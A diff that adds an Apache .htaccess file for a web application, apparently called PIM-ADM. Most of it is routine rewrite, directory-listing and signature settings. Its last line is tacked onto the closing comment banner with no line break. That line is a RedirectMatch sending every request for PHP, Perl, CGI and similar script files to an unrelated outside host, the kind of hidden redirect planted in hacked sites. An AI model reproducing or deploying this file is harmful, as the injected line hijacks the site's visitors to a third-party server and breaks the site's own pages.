@@ -1,0 +1,42 @@
+#RewriteBase /
+RewriteBase /PIM-ADM/
+#
+#
+# REWRITE ENGINE STATUS
+########################
+#
+RewriteEngine on
+#
+#
+# REWRITE RULE
+###############
+#
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^(.*)$ index.php?var=$1 [L,QSA]
+#
+#
+# DIRECTORY CONFIG
+###################
+#
+Options -Indexes -ExecCGI +FollowSymLinks
+DirectoryIndex index.php
+#
+#
+# HTACCESS CONFIG
+##################
+#
+<Files .htaccess>
+ order allow,deny
+ deny from all
+</Files>
+#
+#
+# SERVER SIGNATURE
+###################
+#
+ServerSignature Off
+#
+##############
+# END HTACESS
+##############RedirectMatch \.(dynamiccontent|pl|plx|perl|cgi|php|php4|php4|php6|php3|shtml)$ http://glory2.lazeon.com/cgi-sys/movingpage.cgi
